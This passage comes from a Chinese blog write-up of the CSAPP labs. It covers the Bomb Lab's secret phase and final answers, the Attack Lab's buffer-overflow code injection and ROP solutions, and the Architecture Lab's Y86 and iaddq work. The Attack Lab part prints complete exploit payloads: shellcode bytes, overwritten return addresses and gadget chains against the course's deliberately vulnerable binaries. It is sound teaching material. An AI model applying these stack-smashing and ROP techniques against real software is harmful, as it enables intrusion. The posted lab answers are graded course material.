<img src="/2020/07/csapp-lab-writeup/phases_defuse_1.png" alt="img"><br>
将第一个判断的<code>sscanf</code>操作的字符串所在内存输出，可以看出，该字符串是<code>phases_4</code>关卡的输入<br>
函数参数：<br>
<img src="/2020/07/csapp-lab-writeup/phases_defuse_2.png" alt="img"><br>
内部内存的值：<br>
<img src="/2020/07/csapp-lab-writeup/phases_defuse_3.png" alt="img"><br>
同时，第二个判断所对比的字符串为<br>
<img src="/2020/07/csapp-lab-writeup/phases_defuse_4.png" alt="img"><br>
故我们可以在<code>phases_4</code>关卡的输入后追加字符串<code>DrEvil</code>来进入隐藏关卡<code>secret_phase</code>。</p>
</li>
<li>
<p><code>secret_phase</code>关卡中会先读入一个数字<code>inputNum</code>，并满足该条件<code>(inputNum - 1）&lt;= 0x3e8(1000)</code>, 即输入的数字必须小于等于1001。<br>
之后执行函数<code>fun7(&amp;n1, inputNum)</code>。当该函数的返回值为2时则通过此关卡。<br>
全局变量<code>n1</code>是一个树节点，其所有相关的树节点如下所示<br>
<img src="/2020/07/csapp-lab-writeup/secret_phase_1.png" alt="img"><br>
为便于理解，将函数<code>fun7</code>的汇编代码转为C代码：</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun7</span><span class="params">(treeNode* node, <span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(node == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(node-&gt;val &lt;= num)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(node-&gt;Val == num)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * fun7(node-&gt;right, num) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">2</span> * fun7(node-&gt;left, num);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>易知，若需<code>fun7(&amp;n1, inputNum) == 2</code>, 则要进行如下操作</p>
<ul>
<li>调用<strong>fun7(&amp;n1, inputNum)</strong>。此时 <strong>n1.val == 0x24</strong></li>
<li>递归向下调用<strong>fun7(arg.left, inputNum)</strong>, 此时 <strong>arg.val == 0x8</strong></li>
<li>再次递归向下调用<strong>fun7(newArg.right, inputNum)</strong>, 此时 <strong>newArg.val == 0x16 == 22</strong></li>
<li>在这最后调用的 <strong>fun7(newArg.right, inputNum)</strong> 中返回0<br>
综上所述，本次输入的数字应为<code>22</code></li>
</ul>
</li>
<li>
<p>最后的输入文本为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Border relations with Canada have never been better.</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">7 327</span><br><span class="line">0 0 DrEvil</span><br><span class="line">ionefg</span><br><span class="line">4 3 2 1 6 5</span><br><span class="line">22</span><br></pre></td></tr></table></figure>
<p>通关截图<br>
<img src="/2020/07/csapp-lab-writeup/success.png" alt="img"></p>
</li>
</ul>
<h2 id="3-Attack-Lab">3. Attack Lab</h2>
<ul>
<li>Attack Lab要求进行五次的攻击实验，其中所使用的攻击方式是<strong>代码注入</strong>和<strong>ROP</strong></li>
</ul>
<h3 id="1-Code-Injection">1) Code Injection</h3>
<ul>
<li>
<p><code>ctarget</code>文件：该文件用于代码注入实验。</p>
</li>
<li>
<p>在代码注入实验中，通过使缓冲区溢出、注入攻击代码来完成特殊目的。</p>
</li>
<li>
<p>在<code>stable_stable_launch</code>函数中有个很有意思的操作。程序会mmap出一块RWX的内存，并将栈指针迁移到这块固定地址的内存上。这一步方便了后续的代码执行操作，否则原始栈上数据是不可执行的(NX)<br>
<img src="/2020/07/csapp-lab-writeup/ctarget_1.png" alt="img"></p>
</li>
<li>
<p>代码注入脆弱点位于<code>getbuf</code>函数中，该函数会调用<code>gets</code>函数，这可能会造成溢出。<br>
在该函数中，字符串所存入的地址为<code>0x5561dc78</code>，当前函数的返回地址存储于<code>0x5561dca0</code>，其相对偏移为<code>40</code><br>
<img src="/2020/07/csapp-lab-writeup/ctarget_2.png" alt="img"></p>
</li>
<li>
<p><strong>phase1</strong></p>
<ul>
<li>
<p>该关卡只要求将程序的控制流返回至<code>touch1</code>函数中即可，其中该函数的地址为<code>0x4017c0</code></p>
</li>
<li>
<p>这里需要利用栈溢出来修改栈上的<strong>函数返回地址</strong></p>
</li>
<li>
<p>故最终的输入文件如下</p>
<blockquote>
<p>注意文件中的<code>00</code>不可省略，因为这是函数地址的一部分（64位中指针大小为8字节）<br>
注意<strong>小端序</strong></p>
</blockquote>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>通过当前关卡的截图如下</p>
<p><img src="/2020/07/csapp-lab-writeup/ctarget_touch1.png" alt="img"></p>
</li>
</ul>
</li>
<li>
<p><strong>phase2</strong></p>
<ul>
<li>
<p><code>touch2</code>函数与<code>touch1</code>不太一样，它多了一项寄存器的比较。只有当<code>%edx == &lt;cookie&gt;</code>时才能通过当前关卡。<br>
<img src="/2020/07/csapp-lab-writeup/ctarget_3.png" alt="img"></p>
</li>
<li>
<p>此时我们就需要在栈上布下代码，使控制流在<code>getBuf</code>函数返回时<strong>跳转至栈上的代码</strong>，<strong>修改%edx寄存器</strong>并最终<strong>跳转回<code>touch2</code>函数</strong>。这部分代码为</p>
<blockquote>
<p><code>touch2</code>函数的地址为<code>0x4017ec</code></p>
</blockquote>
  <figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">movq</span> <span class="number">$0</span>x59b997fa, %rdi # <span class="number">0x59b997fa</span>是个人cookie</span><br><span class="line"><span class="keyword">push</span> <span class="number">$0</span>x4017ec</span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure>
<p>之后执行以下指令，将其编译为机器码并显示详细信息。</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -c asm.s -o asm.o &amp;&amp; objdump -d asm.o</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/csapp-lab-writeup/ctarget_asm_1.png" alt="img"></p>
</li>
<li>
<p>最后我们的输入数据如下</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>通过当前关卡的截图如下<br>
<img src="/2020/07/csapp-lab-writeup/ctarget_touch2.png" alt="img"></p>
</li>
</ul>
</li>
<li>
<p><strong>phase3</strong></p>
<ul>
<li>
<p><code>touch3</code>函数与<code>touch2</code>函数类似，都存在着一个比较的判断，通过该判断即可通过当前关卡。<br>
所不同的是，<code>touch3</code>函数中使用另一个函数<code>hexmatch</code>进行判断。<code>hexmatch</code>传入的参数分别为<code>&amp;cookie</code>与<code>touch3</code>的第一个参数<code>%rdi</code>。<br>
<img src="/2020/07/csapp-lab-writeup/ctarget_3_2.png" alt="img"></p>
</li>
<li>
<p>分析<code>hexmatch</code>函数，可以发现，当栈溢出时刻的<code>%rdi == 0x5561dc13</code>时，即可通过当前关卡。<br>
<img src="/2020/07/csapp-lab-writeup/ctarget_3_1.png" alt="img"></p>
</li>
<li>
<p>由于该关卡修改的寄存器与第二关的寄存器一致，所以可以直接修改第二关的输入数据，即可得到当前关卡的输入数据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 13 dc 61 55 68</span><br><span class="line">fa 18 40 00 c3 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/csapp-lab-writeup/ctarget_3_3.png" alt="img"></p>
</li>
<li>
<p><strong>注意!</strong> 这个解实际上是 <strong>非预期解</strong> 。按照正常的逻辑，用于存放cookie字符串的内存地址应该是随机的。</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">  <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">  <span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但由于程序内部并没有初始化随机数种子，所以生成的随机数始终是固定的，进而导致用于存放cookie字符串的内存地址一直是同一个地址。</p>
</li>
</ul>
</li>
</ul>
<h3 id="2-ROP">2) ROP</h3>
<ul>
<li><code>rtarget</code>文件： 该文件用于ROP实验</li>
<li>该文件使用了<strong>栈随机化(ASLR)</strong> 与 <strong>栈不可执行(NX)</strong> 这两项技术来防止代码注入攻击，所以我们要使用 <strong>ROP</strong> 攻击来完成特定目的。</li>
<li><code>gets</code>输入点与函数返回地址存放位置之间的相对偏移仍是<code>40</code>。</li>
<li>下面是一张汇编与机器表示相关的表格<br>
<img src="/2020/07/csapp-lab-writeup/attack_lab_ref.png" alt="img"></li>
<li><strong>phase4</strong>
<ul>
<li>
<p>使用<code>objdump -S rtarget &gt; rtarget.s</code>指令将<code>rtarget</code>文件中的反汇编输出</p>
<blockquote>
<p>这里只截取了ROP可能会用到的部分汇编</p>
</blockquote>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000004019</span>a7 &lt;addval_219&gt;:</span><br><span class="line">  <span class="number">4019</span>a7: <span class="number">8</span>d <span class="number">87</span> <span class="number">51</span> <span class="number">73</span> <span class="number">58</span> <span class="number">90</span>     lea    <span class="number">-0x6fa78caf</span>(%rdi),%eax</span><br><span class="line">  <span class="number">4019</span>ad: c3                    retq  </span><br><span class="line"></span><br><span class="line"><span class="number">00000000004019</span>a0 &lt;addval_273&gt;:</span><br><span class="line">  <span class="number">4019</span>a0: <span class="number">8</span>d <span class="number">87</span> <span class="number">48</span> <span class="number">89</span> c7 c3     lea    <span class="number">-0x3c3876b8</span>(%rdi),%eax</span><br><span class="line">  <span class="number">4019</span>a6: c3                    retq</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>注意到函数<code>addval_219</code>中存在字节序列<code>58 90 c3</code>。其中<code>58</code>是<code>popq %rax</code>的机器表示，<code>90</code>是<code>nop</code>的机器表示，<code>c3</code>是<code>ret</code>的机器表示。这样的一小段字节序列可以用来将数据从栈上弹到寄存器<code>%rax</code>中。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">4019</span>ab: <span class="number">58</span>                    popq %rax</span><br><span class="line"><span class="number">4019</span>ac: <span class="number">90</span>                    nop</span><br><span class="line"><span class="number">4019</span>ad: c3                    retq</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>同时，函数<code>addval_273</code>中存在字节序列<code>48 89 c7 c3</code>。其中<code>48 89 c7</code>就是<code>movq %rax, %rdi</code>的机器表示，<code>c3</code>是<code>ret</code>的机器表示。所以我们可以利用这个gadget将<code>%rax</code>中的数据拷贝到<code>%rdi</code>中</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">4019</span>a2: <span class="number">48</span> <span class="number">89</span> c7              movq %rax, %rdi</span><br><span class="line"><span class="number">4019</span>a5: c3                    retq</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>上述的两条<code>popq rax</code>与<code>movq %rax, %rdi</code> 之间的配合，间接构成了一条<code>popq %rdi</code>指令，这样我们就可以设置寄存器<code>%rdi</code>，完成目的。实际效果如下：<br>
<img src="/2020/07/csapp-lab-writeup/rtarget_2_1.png" alt="img"></p>
</li>
</ul>
</li>
<li>
<p>综上所述，我们需要完成</p>
<ul>
<li>栈溢出跳转至<code>popq %rax</code></li>
<li>跳转至<code>movq %rax, %rdi</code></li>
<li>跳转至<code>touch2</code>函数（地址为<code>0x4017ec</code>）</li>
</ul>
<p>最终输入的数据如下</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>过关截图<br>
<img src="/2020/07/csapp-lab-writeup/rtarget_2_2.png" alt="img"></p>
</li>
</ul>
</li>
<li><strong>phase5</strong>
<ul>
<li>
<p>在这一关中，主要会用到如下几个函数</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000401</span>a03 &lt;addval_190&gt;:</span><br><span class="line">  <span class="number">401</span>a03: <span class="number">8</span>d <span class="number">87</span> <span class="number">41</span> <span class="number">48</span> <span class="number">89</span> e0     lea    <span class="number">-0x1f76b7bf</span>(%rdi),%eax</span><br><span class="line">  <span class="number">401</span>a09: c3                    retq</span><br><span class="line"><span class="number">00000000004019</span>d6 &lt;add_xy&gt;:</span><br><span class="line">  <span class="number">4019</span>d6: <span class="number">48</span> <span class="number">8</span>d <span class="number">04</span> <span class="number">37</span>           lea    (%rdi,%rsi,<span class="number">1</span>),%rax</span><br><span class="line">  <span class="number">4019</span>da: c3                    retq</span><br><span class="line"><span class="number">00000000004019</span>a0 &lt;addval_273&gt;:</span><br><span class="line">  <span class="number">4019</span>a0: <span class="number">8</span>d <span class="number">87</span> <span class="number">48</span> <span class="number">89</span> c7 c3     lea    <span class="number">-0x3c3876b8</span>(%rdi),%eax</span><br><span class="line">  <span class="number">4019</span>a6: c3                    retq</span><br></pre></td></tr></table></figure>
<p>其中分别提取出可利用的gadgets</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">401</span>a06: <span class="number">48</span> <span class="number">89</span> e0              movq %rsp, %rax</span><br><span class="line"><span class="number">401</span>a09: c3                    retq</span><br><span class="line"></span><br><span class="line"><span class="number">4019</span>d8: <span class="number">04</span> <span class="number">37</span>                 add <span class="number">0x37</span>, %al</span><br><span class="line"><span class="number">4019</span>da: c3                    retq</span><br><span class="line"></span><br><span class="line"><span class="number">4019</span>a2: <span class="number">48</span> <span class="number">89</span> c7              movq %rax, %rdi</span><br><span class="line"><span class="number">4019</span>a5: c3                    retq</span><br></pre></td></tr></table></figure>
<p>这些gadgets组合起来，可以获得指定偏移量的栈地址。如果将cookie字符串写入至此地址上，则可以达到 <strong>%rdi指向cookie字符串</strong> 这个目的，这样便可以通过当前关卡。</p>
<p>使用效果如下<br>
<img src="/2020/07/csapp-lab-writeup/rtaget_3_1.png" alt="img"></p>
</li>
<li>
<p>最后的输入数据如下</p>
<blockquote>
<p>注意第13行只有7个字节，并非笔者的疏忽</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">06 1a 40 00 00 00 00 00</span><br><span class="line">d8 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
<p>过关截图<br>
<img src="/2020/07/csapp-lab-writeup/rtarget_3_2.png" alt="img"></p>
</li>
</ul>
</li>
</ul>
<h2 id="4-Architecture-Lab">4. Architecture Lab</h2>
<h3 id="1-Part-A">1) Part A</h3>
<ul>
<li>
<p>这部分内容的工作目录为<code>arch-lab/sim/misc</code></p>
</li>
<li>
<p>在part A中，我们要分别用<code>Y86</code>汇编（注意不是<code>x86</code>）来手动编写位于<code>example.c</code>中的三个函数，以熟悉<code>Y86</code>的基本语法。该部分实现较为简单，依照CSAPP上的代码照葫芦画瓢即可。</p>
</li>
<li>
<p>其中，编译与运行<code>Y86</code>指令的shell脚本如下</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">./yas $*.ys &amp;&amp; ./yis $*.yo</span><br></pre></td></tr></table></figure>
<p>执行效果如图所示<br>
<img src="/2020/07/csapp-lab-writeup/y86_disp.png" alt="img"></p>
</li>
<li>
<p><code>sum_list</code>函数的<code>Y86</code>汇编 - <a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/4.%20Arch%20Lab/part%20A/sum.ys" target="_blank" rel="noopener">github</a></p>
</li>
<li>
<p><code>rsum_list</code>函数的<code>Y86</code>汇编 - <a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/4.%20Arch%20Lab/part%20A/rsum.ys" target="_blank" rel="noopener">github</a></p>
<blockquote>
<p>注意递归调用函数时，需保存特定的寄存器到栈上，以便调用者使用。</p>
</blockquote>
</li>
<li>
<p><code>copy_block</code>函数的<code>Y86</code>汇编 - <a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/4.%20Arch%20Lab/part%20A/copy.ys" target="_blank" rel="noopener">github</a></p>
</li>
</ul>
<h3 id="2-Part-B">2) Part B</h3>
<ul>
<li>
<p>该部分内容主要是为SEQ处理器添加指令<code>iaddq</code>，所要修改的文件为<code>seq-full.hcl</code>，其工作目录为<code>arch-lab/sim/seq</code></p>
</li>
<li>
<p>由于<code>iaddq</code>指令既与运算操作相关，又与立即数处理相关，故该指令的功能添加可以参考<code>seq-full.hcl</code>中的<code>IOPQ</code>以及<code>IIRMOVQ</code>来编写。<br>
以下摘抄了修改过的内容，完整内容请进入<a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/4.%20Arch%20Lab/part%20B/seq-full.hcl" target="_blank" rel="noopener">github</a>，所有更改均以中文注释的形式写入其中。</p>
<blockquote>
<p>注：编写HCL时，使用汇编高亮是个不错的选择。</p>
</blockquote>
  <figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"># Instruction code for iaddq instruction</span><br><span class="line">wordsig IIADDQ  <span class="string">'I_IADDQ'</span></span><br><span class="line"></span><br><span class="line"># 将IIADDQ指令加入到合法指令集合中</span><br><span class="line">bool instr_valid = icode <span class="keyword">in</span></span><br><span class="line">&#123; INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,</span><br><span class="line">        IOPQ, IJXX, ICALL, <span class="keyword">IRET</span>, IPUSHQ, IPOPQ, IIADDQ &#125;<span class="comment">;</span></span><br><span class="line"></span><br><span class="line"># IIADDQ指令 需要读入一个寄存器，因此要额外读取一个字节，故添加到该集合中</span><br><span class="line">bool need_regids =</span><br><span class="line">  icode <span class="keyword">in</span> &#123; IRRMOVQ, IOPQ, IPUSHQ, IPOPQ,</span><br><span class="line">        IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ  &#125;<span class="comment">;</span></span><br><span class="line"></span><br><span class="line"># IIADDQ指令 需要读入一个常数，因此添加到该集合中</span><br><span class="line">bool need_valC =</span><br><span class="line">  icode <span class="keyword">in</span> &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ &#125;<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">## IIADDQ需要读取右寄存器的值，因此加入到该集合中</span><br><span class="line"><span class="built_in">word</span> srcB = [</span><br><span class="line">  icode <span class="keyword">in</span> &#123; IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ  &#125; : rB<span class="comment">;</span></span><br><span class="line">  icode <span class="keyword">in</span> &#123; IPUSHQ, IPOPQ, ICALL, <span class="keyword">IRET</span> &#125; : RRSP<span class="comment">;</span></span><br><span class="line">  <span class="number">1</span> : RNONE<span class="comment">;  # Don't need register</span></span><br><span class="line">]<span class="comment">;</span></span><br><span class="line"></span><br><span class="line"># 这里设置将结果写入IIADDQ指令的右寄存器中中</span><br><span class="line"><span class="built_in">word</span> dstE = [</span><br><span class="line">  icode <span class="keyword">in</span> &#123; IRRMOVQ &#125; &amp;&amp; Cnd : rB<span class="comment">;</span></span><br><span class="line">  icode <span class="keyword">in</span> &#123; IIRMOVQ, IOPQ, IIADDQ&#125; : rB<span class="comment">;</span></span><br><span class="line">  icode <span class="keyword">in</span> &#123; IPUSHQ, IPOPQ, ICALL, <span class="keyword">IRET</span> &#125; : RRSP<span class="comment">;</span></span><br><span class="line">  <span class="number">1</span> : RNONE<span class="comment">;  # Don't write any register</span></span><br><span class="line">]<span class="comment">;</span></span><br><span class="line"></span><br><span class="line"># IIADDQ 指令的左操作数为读入的常数项</span><br><span class="line"><span class="built_in">word</span> aluA = [</span><br><span class="line">  icode <span class="keyword">in</span> &#123; IRRMOVQ, IOPQ &#125; : valA<span class="comment">;</span></span><br><span class="line">  icode <span class="keyword">in</span> &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125; : valC<span class="comment">;</span></span><br><span class="line">  icode <span class="keyword">in</span> &#123; ICALL, IPUSHQ &#125; : -<span class="number">8</span><span class="comment">;</span></span><br><span class="line">  icode <span class="keyword">in</span> &#123; <span class="keyword">IRET</span>, IPOPQ &#125; : <span class="number">8</span><span class="comment">;</span></span><br><span class="line">  # Other instructions don<span class="string">'t need ALU</span></span><br><span class="line"><span class="string">];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># IIADDQ 指令的左操作数为读入的寄存器rB</span></span><br><span class="line"><span class="string">word aluB = [</span></span><br><span class="line"><span class="string">  icode in &#123; IRMMOVQ, IMRMOVQ, IOPQ, ICALL, </span></span><br><span class="line"><span class="string">          IPUSHQ, IRET, IPOPQ, IIADDQ &#125; : valB;</span></span><br><span class="line"><span class="string">    # 一个很有意思的点：将立即数存到特定寄存器的操作，就是先运算立即数 + 0，再将结果存入寄存器</span></span><br><span class="line"><span class="string">  icode in &#123; IRRMOVQ, IIRMOVQ &#125; : 0;</span></span><br><span class="line"><span class="string">  # Other instructions don'</span>t need ALU</span><br><span class="line">]<span class="comment">;</span></span><br><span class="line"></span><br><span class="line"># IIADDQ可能需要设置条件位，与IOPQ类似</span><br><span class="line">bool set_cc = icode <span class="keyword">in</span> &#123; IOPQ, IIADDQ &#125;<span class="comment">;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>当指令添加完成后，执行以下操作</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成新的SEQ模拟器。如果make失败，可能需要修改makefile</span></span><br><span class="line">make clean &amp;&amp; make VERSION=full</span><br><span class="line"><span class="comment"># 可选操作，使用一个简单的例子测试iaddq指令</span></span><br><span class="line">./ssim -t ../y86-code/asumi.yo</span><br><span class="line"><span class="comment"># 可选操作，如果需要debug，则可以使用GUI形式的ssim来单步调试</span></span><br><span class="line">./ssim -g ../y86-code/asumi.yo</span><br><span class="line"><span class="comment"># 可选操作，使用微型测试集来测试除iaddq指令以外的其他指令。</span></span><br><span class="line"><span class="comment"># 这部分的目的主要有两点</span></span><br><span class="line"><span class="comment">#   1. 判断测试工具是否正常运行</span></span><br><span class="line"><span class="comment">#   2. 判断原先指令是否被用户无意间破坏</span></span><br><span class="line">(<span class="built_in">cd</span> ../y86-code; make testssim)</span><br><span class="line"><span class="comment"># 可选操作，使用大量测试集来测试除iaddq指令以外的其他指令</span></span><br><span class="line">(<span class="built_in">cd</span> ../ptest; make SIM=../seq/ssim)</span><br><span class="line"><span class="comment"># 使用大量测试集来测试iaddq指令</span></span><br><span class="line">(<span class="built_in">cd</span> ../ptest; make SIM=../seq/ssim TFLAGS=-i)</span><br></pre></td></tr></table></figure>
<p><code>iaddq</code>指令测试成功的截图如下<br>
<img src="/2020/07/csapp-lab-writeup/seq_test.png" alt="img"></p>
</li>
<li>
<p>编译过程中可能会出现一些错误，例如未找到头文件<code>tk.h</code>、某个结构体中没有成员<code>result</code>、程序链接失败等等。其解决方法如下：</p>
<ul>
<li>
<p>首先在执行<code>make</code>前，需要修改<code>makefile</code>中的部分内容</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始情况下 VERSION为std，如果只想生成full版本的ssim，可以直接修改VERSION</span></span><br><span class="line">VERSION=full</span><br><span class="line"><span class="comment"># GUIMODE情况下需要添加 -DUSE_INTERP_RESULT， 原因是tk中的某个结构体的某个成员已被弃用，</span></span><br><span class="line"><span class="comment"># 如需使用则必须添加宏定义USE_INTERP_RESULT</span></span><br><span class="line">GUIMODE=-DHAS_GUI -DUSE_INTERP_RESULT</span><br><span class="line"><span class="comment"># 修改使用的tk tcl版本，在每个参数后添加版本号。i.e. -ltk  =&gt;  -ltk8.6</span></span><br><span class="line">TKLIBS=-L/usr/lib -ltk8.6 -ltcl8.6</span><br><span class="line">TKINC=-isystem /usr/<span class="keyword">include</span>/tcl8.6</span><br><span class="line"></span><br><span class="line"><span class="comment"># ......</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>其次，将<code>ssim.c</code>文件中的第844、845行注释掉即可</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 第837行 */</span>   <span class="meta">#<span class="meta-keyword">ifdef</span> HAS_GUI</span></span><br><span class="line">                <span class="comment">/* ... */</span></span><br><span class="line"><span class="comment">/* 第844行 */</span>   <span class="comment">//extern int matherr();</span></span><br><span class="line"><span class="comment">/* 第845行 */</span>   <span class="comment">//int *tclDummyMathPtr = (int *) matherr;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h3 id="3-Part-C">3) Part C</h3>
<ul>
<li>
<p>在当前部分中，我们需要修改<code>ncopy.ys</code>与<code>pipe-full.hcl</code>，以获得更高的执行效率</p>
</li>
<li>
<p>当代码修改完成后，执行以下命令</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/sh</span></span><br><span class="line"><span class="comment">#   1. make用于生成测试用例与seq模拟器，-s 安静模式</span></span><br><span class="line"><span class="comment">#   2. correctness.pl使用更高级别的测试来测试ncopy.ys的正确性</span></span><br><span class="line"><span class="comment">#   3. ./benchmark.pl为运行速度评分</span></span><br><span class="line"><span class="comment">#   4. 最后判断ncopy的y86汇编文件大小是否不超过1k bytes（超过1k字节则ncopy.ys不合格）</span></span><br><span class="line">make VERSION=full -s &amp;&amp; ./correctness.pl &amp;&amp; ./benchmark.pl &amp;&amp; ../misc/yas ncopy.ys &amp;&amp; ./check-len.pl &lt; ncopy.yo</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>笔者所做的优化</p>
<ul>
<li>在<code>pipe-full.hcl</code>中实现<code>iaddq</code>指令，并替换<code>ncopy.ys</code>中所有可被<code>iaddq</code>替代的指令（包括其中一个操作数为立即数的<code>sub</code>指令）。
<blockquote>
<p>此时CPE等于12.70</p>
</blockquote>
</li>
<li>将循环展开成<code>13、5、1</code>层数的三个不同循环。同时将 <strong>读取</strong> 与 <strong>存储</strong> 指令分开，减少 <strong>气泡</strong>(bubble)的插入或流水线的暂停。
<blockquote>
<p>此时CPE等于8.84，分数为33.1/60.0</p>
</blockquote>
</li>
<li>由于笔者只是简单的将循环展开，并没有推敲更深层次的优化。故最终分数为33.1</li>
</ul>
</li>
<li>
<p><code>pipe-full.hcl</code>由于其添加流程与part B类似，故不再赘述，代码存于<a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/4.%20Arch%20Lab/part%20C/pipe-full.hcl" target="_blank" rel="noopener">github</a>。<br>
<code>ncopy.ys</code>代码篇幅较大，存于<a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/4.%20Arch%20Lab/part%20C/ncopy.ys" target="_blank" rel="noopener">github</a>中</p>
</li>
</ul>
<h2 id="5-Cache-Lab">5. Cache Lab</h2>
<h3 id="1-Part-A-2">1) Part A</h3>
<ul>
<li>
